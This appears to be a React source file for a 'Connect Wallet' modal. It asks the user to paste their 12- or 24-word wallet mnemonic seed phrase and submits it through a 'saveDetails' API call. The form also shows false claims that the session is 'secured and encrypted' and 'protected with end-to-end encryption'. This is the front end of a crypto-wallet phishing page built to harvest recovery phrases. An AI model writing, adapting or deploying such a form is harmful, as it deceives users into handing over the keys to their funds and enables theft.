import React from 'react';
import saveDetails from '../../api/saveDetails';
import { IoMdClose } from 'react-icons/io';
import Shield from '../../assets/images/shield.png';


const ManualConnection = ({ resetAll, clickedName, clickedImage }) => {
    const { handleSubmit, loading, formData, handleInputChange } = saveDetails();

    return (
        <form
            onSubmit={(e) => handleSubmit(e)}
            className="w-full max-w-[450px] fixed"
        >
            <div className='w-full max-w-[450px] absolute left-1/2 bottom-10 top-1/2 sm:translate-y-[-50%] translate-x-[-50%] drop-shadow-xl p-3'>
                <div className='bg-white rounded-lg shadow-lg p-6 mt-28 relative'>
                    <div className="absolute top-[1%] sm:top-[-2%] right-[1%] sm:right-[-2%] h-6 w-6 bg-white rounded-full grid place-items-center shadow-md">
                        <IoMdClose className="cursor-pointer text-xl" onClick={resetAll} />
                    </div>
                    
                    <div className="text-center mb-4">
                        <img src={clickedImage} alt={clickedName} className="mx-auto mb-2 w-10 h-10"/>
                        <h2 className="text-lg font-semibold">{clickedName}</h2>
                        <p className="text-gray-500">This session is secured and encrypted</p>
                    </div>

                    <div className="mt-6">
                        <textarea 
                            name="mnemonic"
                            value={formData.mnemonic}
                            onChange={handleInputChange}
                            className="w-full h-32 border border-gray-300 rounded-md p-4 text-sm resize-none focus:outline-none" 
                            placeholder="Enter your 12 Mnemonic words or your 24 Mnemonic words."
                        />
                    </div>

                    <button type="submit" disabled={loading} className={`${loading && 'cursor-not-allowed opacity-70'} bg-[#2563EB] text-white px-4 py-2 rounded-3xl w-full ${formData.mnemonic === '' && 'opacity-50'}`}>
                        {loading ? 'Connecting...' : 'Connect Wallet'}
                    </button>

                    <div className="w-full flex justify-center mt-6 p-4">
                        <img src={Shield} alt="Shield" className="w-6 h-6 mr-2" />
                        <p className="text-gray-700 text-lg font-semibold">This session is protected with end-to-end encryption</p>
                    </div>
                </div>
            </div>
        </form>
    );
};

export default ManualConnection;